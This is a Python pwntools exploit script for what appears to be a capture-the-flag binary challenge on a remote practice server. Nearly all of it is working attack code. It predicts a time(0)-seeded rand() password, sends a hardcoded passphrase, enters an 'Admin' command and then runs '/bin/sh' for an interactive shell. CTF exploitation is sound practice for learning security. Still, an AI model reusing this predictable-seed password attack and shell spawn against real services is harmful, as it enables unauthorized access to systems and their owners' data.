'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

1. pseudo random bypass | srand time(0)
2. 10 * 5 rand() % 26
3. 30 rand() % 26 == password

! need to try many times to synchronize time with remote server
! and the libc version has no effect on the exploit
'''

from pwn import *
from ctypes import *
# from LibcSearcher import *


local = 1
url, port = "node5.buuoj.cn", "26583" 
filename = "./pwn"
elf = ELF(filename)
libc_name = "/lib/x86_64-linux-gnu/libc.so.6"
libc = cdll.LoadLibrary(libc_name)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    context.log_level = "debug"
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

def pwn():
    # 'secret_passwd_anti_bad_guys'
    # 'Help' | 'Exit' | 'Jump' | 'GetName' | 'Rename' | 'Check' | 'GoBack' | 'Search' | 'Nap' | 'Admin'
    seed = libc.time(0)
    libc.srand(seed)

    io.sendlineafter(b'Passwd: ', b'secret_passwd_anti_bad_guys')

    for i in range(11):
        [libc.rand() % 26 + 97 for _ in range(5)]
    
    # password = b''
    # for i in range(30):
    #     password += bytes([libc.rand() % 26 + 97])
    password = bytes([libc.rand() % 26 + 97 for _ in range(30)])
    io.sendlineafter(b'>', b'Admin' + b'\x00')
    io.sendlineafter(b'> ', password + b'\x00')
    io.sendlineafter(b'The command to exec\n> ', b'/bin/sh\x00')


if __name__ == "__main__":
    pwn()
    io.interactive()
